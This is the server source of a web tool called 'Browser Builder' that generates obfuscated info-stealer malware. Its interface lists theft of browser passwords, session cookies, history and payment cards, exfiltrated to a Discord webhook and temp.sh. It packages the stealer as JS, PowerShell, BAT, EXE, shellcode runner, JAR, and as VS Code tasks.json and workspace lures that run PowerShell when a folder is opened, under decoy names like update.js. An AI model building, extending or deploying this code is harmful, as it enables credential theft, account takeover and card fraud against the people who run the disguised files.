import { readFileSync } from "fs";
import { join, dirname } from "path";
import { fileURLToPath } from "url";
import { applyPolymorphicNames } from "./formats/polymorphic.js";
import { obfuscate } from "./formats/obfuscate.js";
import { buildPs1 } from "./formats/ps1.js";
import { buildBat } from "./formats/bat.js";
import { buildTasksJson } from "./formats/tasks.js";
import { buildDonut } from "./formats/donut.js";
import { buildJar } from "./formats/jar.js";
import { buildIdeTaskRce } from "./formats/ide_task.js";

const PORT    = parseInt(process.env.BROWSER_BUILDER_PORT || "5176");
const HOST    = process.env.HOST || "0.0.0.0";
const PAYLOAD = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "payload.js"), "utf8");

async function buildJs(webhook: string): Promise<string> {
  const substituted = PAYLOAD.replace(/__WEBHOOK_URL__/g,
    webhook.replace(/\\/g, "\\\\").replace(/'/g, "\\'"));
  const { code: polymorphic } = applyPolymorphicNames(substituted);
  return await obfuscate(polymorphic);
}

const UI_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Browser Builder</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#09090b;color:#e4e4e7;font-family:'Segoe UI',system-ui,sans-serif;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem}
.card{background:#111113;border:1px solid #27272a;border-radius:14px;
  padding:2.5rem 2rem;width:100%;max-width:520px;box-shadow:0 25px 50px rgba(0,0,0,.5)}
h1{font-size:1.3rem;font-weight:700;color:#a78bfa;margin-bottom:.4rem}
.sub{font-size:.82rem;color:#71717a;margin-bottom:2rem}
label{display:block;font-size:.78rem;font-weight:500;color:#a1a1aa;margin-bottom:.4rem;
  text-transform:uppercase;letter-spacing:.04em}
input,select{width:100%;background:#09090b;border:1px solid #27272a;border-radius:8px;
  padding:.65rem .9rem;color:#e4e4e7;font-size:.875rem;outline:none;margin-bottom:1.25rem;transition:.15s border-color}
input:focus,select:focus{border-color:#7c3aed}
select option{background:#09090b}
.fmts{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:1.25rem}
.fmts2{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:1.25rem}
.fmt{background:#18181b;border:2px solid #27272a;border-radius:8px;padding:.6rem .4rem;
  font-size:.78rem;color:#a1a1aa;text-align:center;cursor:pointer;transition:.15s;user-select:none}
.fmt:hover{border-color:#4c1d95;color:#e4e4e7}
.fmt.active{border-color:#7c3aed;color:#a78bfa;background:#1e1b3a}
.fmt .icon{font-size:1.1rem;margin-bottom:.2rem}
.feat{background:#18181b;border:1px solid #27272a;border-radius:8px;
  padding:.5rem .7rem;font-size:.75rem;color:#a1a1aa;display:flex;align-items:center;gap:.35rem;margin-bottom:.5rem}
.feats{display:grid;grid-template-columns:1fr 1fr;gap:.4rem;margin-bottom:1.5rem}
button[type=submit]{width:100%;background:linear-gradient(135deg,#7c3aed,#6d28d9);
  border:none;border-radius:8px;padding:.75rem;color:#fff;font-size:.9rem;font-weight:700;
  cursor:pointer;transition:.15s}
button[type=submit]:hover{background:linear-gradient(135deg,#8b5cf6,#7c3aed);
  transform:translateY(-1px);box-shadow:0 8px 25px rgba(124,58,237,.35)}
button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow:none}
.err{color:#f87171;font-size:.8rem;margin-top:.75rem;text-align:center;display:none}
.note{font-size:.72rem;color:#52525b;margin-top:.5rem;text-align:center}
</style>
</head>
<body>
<div class="card">
  <h1>&#x1F577; Browser Builder</h1>
  <p class="sub">Node.js browser retrieval tool. Discord C2 + temp.sh exfil.</p>

  <div class="feats">
    <div class="feat">&#x1F511; Passwords (Chrome/Edge/FF)</div>
    <div class="feat">&#x1F36A; Cookies (session tokens)</div>
    <div class="feat">&#x1F4DC; History (visit frequency)</div>
    <div class="feat">&#x1F4B3; Cards &amp; autofill</div>
    <div class="feat">&#x1F9EC; Polymorphic naming</div>
    <div class="feat">&#x1F510; js-confuser obfuscation</div>
    <div class="feat">&#x1F489; Process injection</div>
    <div class="feat">&#x1F4E4; temp.sh exfil</div>
  </div>

  <form id="f">
    <label>Discord Webhook URL</label>
    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/..." required>

    <label>Output Format</label>
    <div class="fmts">
      <div class="fmt active" data-fmt="js">
        <div class="icon">&#x1F4DC;</div>JS
      </div>
      <div class="fmt" data-fmt="ps1">
        <div class="icon">&#x1F4BB;</div>PS1
      </div>
      <div class="fmt" data-fmt="bat">
        <div class="icon">&#x2699;</div>BAT
      </div>
      <div class="fmt" data-fmt="exe">
        <div class="icon">&#x26A1;</div>EXE
      </div>
    </div>
    <div class="fmts2">
      <div class="fmt" data-fmt="donut">
        <div class="icon">&#x1F4A3;</div>Donut SC
      </div>
      <div class="fmt" data-fmt="jar">
        <div class="icon">&#x2615;</div>JAR
      </div>
      <div class="fmt" data-fmt="tasks">
        <div class="icon">&#x1F5C2;</div>tasks.json
      </div>
      <div class="fmt" data-fmt="kit">
        <div class="icon">&#x1F4E6;</div>Kit (.zip)
      </div>
      <div class="fmt" data-fmt="ide">
        <div class="icon">&#x26A1;</div>IDE RCE
      </div>
    </div>

    <label>Output Filename</label>
    <input type="text" id="fname" value="update.js" placeholder="update.js" required>

    <button type="submit" id="btn">&#x2B07; Build &amp; Download</button>
    <div class="err" id="err"></div>
    <p class="note" id="note">JS: obfuscated + polymorphic. EXE: includes Node.js runtime (~40MB).</p>
  </form>
</div>
<script>
var fmtEl = document.querySelectorAll('.fmts .fmt, .fmts2 .fmt');
var selectedFmt = 'js';
var exts = {js:'js',ps1:'ps1',bat:'bat',exe:'exe',donut:'py',jar:'jar',tasks:'tasks.json',kit:'zip',ide:'zip'};
var defaults = {js:'update.js',ps1:'update.ps1',bat:'update.bat',exe:'update.exe',donut:'donut.py',jar:'update.jar',tasks:'tasks.json',kit:'kit.zip',ide:'workspace.zip'};
var notes = {
  js:'JS: obfuscated + polymorphic names + process injection.',
  ps1:'PS1: PowerShell retrieval + process injection via C# Add-Type.',
  bat:'BAT: drops encoded PS1 to temp, runs hidden, self-deletes.',
  exe:'EXE: standalone (~40MB, bundles Node.js runtime). Takes ~60s to build.',
  donut:'Donut SC: Python ctypes shellcode runner. Resolves WinExec at runtime, injects x64 stub.',
  jar:'JAR: Java launcher. Drops PS1 to temp + runs hidden. No Java source needed at runtime.',
  tasks:'tasks.json: VS Code folder lure. Auto-runs PS1 one-liner on folder open.',
  kit:'Kit: ZIP containing PS1 + BAT + tasks.json + JAR (all formats bundled).',
  ide:'IDE RCE: Malicious VS Code workspace. Triggers PowerShell RCE on folder open.'
};
fmtEl.forEach(function(b){
  b.addEventListener('click',function(){
    fmtEl.forEach(function(x){x.classList.remove('active')});
    b.classList.add('active');
    selectedFmt=b.dataset.fmt;
    document.getElementById('fname').value=defaults[selectedFmt];
    document.getElementById('note').textContent=notes[selectedFmt];
  });
});
document.getElementById('f').onsubmit=async function(e){
  e.preventDefault();
  var err=document.getElementById('err'),btn=document.getElementById('btn');
  err.style.display='none';btn.disabled=true;
  var slowFmts = {exe:'Building EXE\u2026 (~60s)', kit:'Building Kit\u2026 (~5s)'};
  btn.textContent=slowFmts[selectedFmt]||'Building\u2026';
  try{
    var res=await fetch('/api/build',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({webhook:document.getElementById('webhook').value,
                           format:selectedFmt,
                           filename:document.getElementById('fname').value||defaults[selectedFmt]})
    });
    if(!res.ok){var d=await res.json().catch(function(){return{};});err.textContent=d.error||'Build failed';err.style.display='block';return;}
    var blob=await res.blob(),url=URL.createObjectURL(blob);
    var a=document.createElement('a');a.href=url;
    a.download=document.getElementById('fname').value;a.click();URL.revokeObjectURL(url);
  }catch(ex){err.textContent=ex.message;err.style.display='block';}
  finally{btn.disabled=false;btn.textContent='&#x2B07; Build & Download';}
};
</script>
</body>
</html>`;

const server = Bun.serve({
  port: PORT,
  hostname: HOST,
  async fetch(req) {
    const url = new URL(req.url);
    if (url.pathname === "/health") return Response.json({ ok: true });
    if (url.pathname === "/" || url.pathname === "")
      return new Response(UI_HTML, { headers: { "Content-Type": "text/html; charset=utf-8" } });

    if (url.pathname === "/api/build" && req.method === "POST") {
      let body: any;
      try { body = await req.json(); } catch {
        return Response.json({ error: "Invalid JSON" }, { status: 400 });
      }

      const webhook: string = (body?.webhook || "").trim();
      if (!webhook.startsWith("https://discord.com/api/webhooks/"))
        return Response.json({ error: "Invalid Discord webhook URL" }, { status: 400 });

      const VALID_FORMATS = new Set(["js","ps1","bat","exe","donut","jar","tasks","kit","ide"]);
      const format: string = VALID_FORMATS.has(body?.format) ? body.format : "js";
      const filename: string = (body?.filename || "update.js")
        .replace(/[^\w\-. ]/g, "_").slice(0, 64);

      const mimes: Record<string, string> = {
        js:    "application/javascript",
        ps1:   "text/plain",
        bat:   "text/plain",
        exe:   "application/octet-stream",
        donut: "text/x-python",
        jar:   "application/java-archive",
        tasks: "application/json",
        kit:   "application/zip",
        ide:   "application/zip",
      };

      try {
        let output: Buffer | string;

        if (format === "ps1") {
          output = buildPs1(webhook);
        } else if (format === "bat") {
          output = buildBat(webhook);
        } else if (format === "donut") {
          output = buildDonut(webhook);
        } else if (format === "tasks") {
          output = buildTasksJson(webhook);
        } else if (format === "jar") {
          output = await buildJar(webhook);
        } else if (format === "kit") {
          const { buildKit } = await import("./formats/kit.js");
          output = await buildKit(webhook);
        } else if (format === "ide") {
          output = await buildIdeTaskRce(webhook);
        } else if (format === "exe") {
          // Lazy-load exe builder (heavy pkg dependency)
          const { buildExe } = await import("./formats/exe.js");
          const obfuscatedJs = await buildJs(webhook);
          output = await buildExe(obfuscatedJs);
        } else {
          // JS (default)
          output = await buildJs(webhook);
        }

        const buf = typeof output === "string" ? Buffer.from(output, "utf8") : output;
        return new Response(buf, {
          headers: {
            "Content-Type": mimes[format] || "application/octet-stream",
            "Content-Disposition": `attachment; filename="${filename}"`,
            "Content-Length": String(buf.length),
          },
        });
      } catch (err: any) {
        console.error("[browser-builder] build error:", err?.message);
        return Response.json({ error: err?.message || "Build failed" }, { status: 500 });
      }
    }

    return new Response("Not found", { status: 404 });
  },
  error(err) {
    console.error("[browser-builder]", err);
    return Response.json({ error: "Internal error" }, { status: 500 });
  },
});

console.log(`[browser-builder] http://${HOST}:${PORT}`);
